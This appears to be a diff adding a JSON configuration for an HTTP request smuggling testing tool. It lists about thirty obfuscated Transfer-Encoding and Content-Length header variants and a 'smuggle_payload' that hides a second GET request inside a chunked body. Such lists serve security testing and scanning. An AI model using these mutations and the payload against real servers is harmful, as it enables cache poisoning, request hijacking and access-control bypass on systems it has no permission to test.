@@ -1,0 +1,237 @@
+{
+  "permute": [
+    {
+      "type": "spacejoin",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "x-rout",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "X:X\rTransfer-Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "x-nout",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "X:X\nTransfer-Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "Non-breaking space",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:\u00A0",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "Escape Character",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:\u001B",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "Horizontal Tab",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:\u0009",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "Double Colon CL",
+      "content_length_key": "Content-Length::",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "Double Colon TE",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding::",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "default",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "underjoin",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer_Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "space1",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: ",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "space2",
+      "content_length_key": "Content-Length: ",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "space3",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding :",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "valueprefix1",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:  ",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "tabprefix1",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:\t",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "Next Line",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:\u0085",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "commaCow",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: ",
+        "te_value": "chunked, identity"
+      }
+    },
+    {
+      "type": "cowComma",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: ",
+        "te_value": "identity, chunked"
+      }
+    },
+    {
+      "type": "linewrapped1",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:\n",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "gareth1",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding\n : ",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "quoted",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: ",
+        "te_value": "\"chunked\""
+      }
+    },
+    {
+      "type": "aposed",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding:",
+        "te_value": "'chunked'"
+      }
+    },
+    {
+      "type": "vertwrap",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: \n\u000B",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "tabwrap",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: \n\t",
+        "te_value": "chunked"
+      }
+    },
+    {
+      "type": "dualchunk",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "Transfer-Encoding: ",
+        "te_value": "chunked\r\nTransfer-Encoding: identity"
+      }
+    },
+    {
+      "type": "multiCase",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "TrAnSFer-EnCODinG: ",
+        "te_value": "cHuNkeD"
+      }
+    },
+    {
+      "type": "UPPERCASE",
+      "content_length_key": "Content-Length:",
+      "transfer_encoding": {
+        "te_key": "TRANSFER-ENCODING: ",
+        "te_value": "CHUNKED"
+      }
+    },
+   {
+     "type": "formfeed",
+     "content_length_key": "Content-Length:",
+     "transfer_encoding": {
+       "te_key": "Transfer-Encoding:",
+       "te_value": "\u000Cchunked"
+     }
+   },
+   {
+     "type": "vertab",
+     "content_length_key": "Content-Length:",
+     "transfer_encoding": {
+       "te_key": "Transfer-Encoding:",
+       "te_value": "\u000Bchunked"
+     }
+   }
+  ],
+  "smuggle_payload": "1\\r\\nA\\r\\n0\\r\\n\\r\\nGET / HTTP/1.1\\r\\nX-Foo: Bar"
+}
